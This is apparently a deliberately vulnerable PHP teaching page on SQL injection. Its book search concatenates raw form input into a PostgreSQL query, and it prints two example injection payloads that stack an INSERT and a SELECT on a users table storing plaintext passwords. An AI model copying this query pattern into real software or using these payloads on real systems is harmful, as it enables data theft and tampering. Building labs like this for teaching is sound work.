<?php
$db = pg_connect("dbname=foo_db user=postgres options='--client_encoding=UTF8'");
/*
setup query
=======

create table books (id serial PRIMARY KEY, name text NOT NULL, created_at timestamp NOT NULL, updated_at timestamp NOT NULL);
insert into books (name, created_at, updated_at) values ('foo', now(), now());
create table users (id serial PRIMARY KEY, name text NOT NULL, password text NOT NULL, created_at timestamp NOT NULL, updated_at timestamp NOT NULL);
insert into users (name, password, created_at, updated_at) values ('hoge@example.com', 'abcdeabecd', now(), now());
insert into users (name, password, created_at, updated_at) values ('fuga@example.com', '1230981230', now(), now());
*/
?>
<html>
<body>
<h1>SQL Injection (<a href="index.php">back</a>)</h1>
<hr />
<h2>books search</h2>
<form method="post" action="sql_injection.php">
<input type="text" name="criteria" size="100"><br />
<input type="submit" value="search"><br />
</form>
<h2>result</h2>
<?php
$sql = "SELECT * FROM books";
if (isset($_POST["criteria"])) {
  $sql .= " WHERE name LIKE '%".$_POST["criteria"]."%'";
}
$sql .= " ORDER BY id";
$result = pg_query($db, $sql);
echo "<table border=\"1\" cellpadding=\"5\">";
echo "<tr><th>id</th><th>name</th><th>created_at</th><th>updated_at</th></tr>";
while ($row = pg_fetch_row($result)) {
  echo "<tr><td>$row[0]</td><td>$row[1]</td><td>$row[2]</td><td>$row[3]</td></tr>";
}
echo "</table>";
?>
<hr />
<h2>books search</h2>
<h3>value</h3>
<p><font color="blue">あした</font></p>
<h3>query</h3>
<p>SELECT * FROM books WHERE name LIKE '%<font color="red">あした</font>%';</p>
<hr />
<h2>injection-1 : insert books table</h2>
<h3>value</h3>
<p><font color="blue">'; INSERT INTO books (name, created_at, updated_at) VALUES ('bar', now(), now()); SELECT * FROM books WHERE name LIKE '</font></p>
<h3>query</h3>
<p>1. SELECT * FROM books WHERE name LIKE '%<font color="red">';</font></p>
<p>2. <font color="red">INSERT INTO books (name, created_at, updated_at) VALUES ('bar', now(), now());</font></p>
<p>3. <font color="red">SELECT * FROM books WHERE name LIKE '</font>%';<p>
<hr />
<h2>injection-2 : select users table</h2>
<h3>value</h3>
<p><font color="blue">'; SELECT * FROM users WHERE name LIKE '</font></p>
<h3>query</h3>
<p>1. SELECT * FROM books WHERE name LIKE '%<font color="red">';</font></p>
<p>2. <font color="red">SELECT * FROM users WHERE name LIKE '</font>%';<p>
<hr />
<h2>books table</h2>
<table border="1" cellpadding="5">
<tr><th>id</th><th>name</th><th>created_at</th><th>updated_at</th></tr>
<?php
  $db = pg_connect("dbname=foo_db user=postgres options='--client_encoding=UTF8'");
  $result = pg_query($db, "SELECT * FROM books ORDER BY id");
  while ($row = pg_fetch_row($result)) {
    echo "<tr><td>$row[0]</td><td>$row[1]</td><td>$row[2]</td><td>$row[3]</td></tr>";
  }
?>
</table>
<h2>users table</h2>
<table border="1" cellpadding="5">
<tr><th>id</th><th>name</th><th>password</th><th>created_at</th><th>updated_at</th></tr>
<?php
  $result = pg_query($db, "SELECT * FROM users ORDER BY id");
  while ($row = pg_fetch_row($result)) {
    echo "<tr><td>$row[0]</td><td>$row[1]</td><td>$row[2]</td><td>$row[3]</td><td>$row[4]</td></tr>";
  }
?>
</table>
<hr />
</body>
</html>
